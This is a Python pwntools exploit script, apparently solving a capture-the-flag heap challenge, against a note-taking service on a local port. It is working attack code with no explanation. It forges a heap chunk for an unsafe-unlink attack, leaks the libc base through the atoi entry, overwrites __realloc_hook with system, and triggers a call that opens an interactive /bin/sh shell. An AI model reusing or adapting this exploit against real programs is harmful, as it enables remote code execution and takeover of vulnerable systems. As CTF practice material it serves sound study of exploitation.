from pwn import *
import time
p = remote('127.0.0.1',1234)

def title(Title):
    p.recvuntil('option--->>\n')
    p.sendline(str(1))
    p.recvuntil('enter the title:')
    p.send(Title)

def content(Size,Content):
    p.recvuntil('option--->>\n')
    p.sendline(str(2))
    p.recvuntil('Enter the content size(64-256):')
    p.sendline(str(Size))
    p.recvuntil('Enter the content:')
    p.send(Content)

def comment(Cmn):
    p.recvuntil('option--->>\n')
    p.sendline(str(3))
    p.recvuntil('Enter the comment:')
    p.send(Cmn)

def show():
    p.recvuntil('option--->>\n')
    p.sendline(str(4))

def exploit():
    payload = p64(0)+p64(0x20)+p64(0x602070-0x18)+p64(0x602070-0x10)+p64(0x20)
    content(0x68,'A'*0x38+p64(0x41)+'\n')
    title(payload+'@')

    content(0x5000,'this step is to free one original content chunk\n')
    time.sleep(0.5)
    content(0x20000,'this step is to unlink\n')
    time.sleep(0.5)

    title(p64(0x602050)+p64(0x601fd0)+'\n')
    show()
    p.recvuntil('The content is:')
    libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))-libc.symbols['atoi']
    print('The libc base address is:' + hex(libc.address))
    __realloc_hook = libc.symbols['__realloc_hook']
    print('The realloc_hook address is:'+hex(__realloc_hook))
    system = libc.symbols['system']
    print('The system address is:'+hex(system))
    binsh_addr = next(libc.search('/bin/sh'))
    print('The binsh address is:'+hex(binsh_addr))

    title(p64(__realloc_hook)+'\n')
    time.sleep(0.5)
    comment(p64(system)+'\n')
    time.sleep(1)

    title(p64(0x602050)+p64(binsh_addr)+'\n')
    time.sleep(1)
    comment(p64(0)+'\n')
    time.sleep(0.5)

    p.recvuntil('option--->>\n')
    p.sendline(str(2))
    p.recvuntil('Enter the content size(64-256):')
    p.sendline('0x100')

libc = ELF('/home/pur3uit/build/build-2.25/lib/libc.so.6')
exploit()
p.interactive()
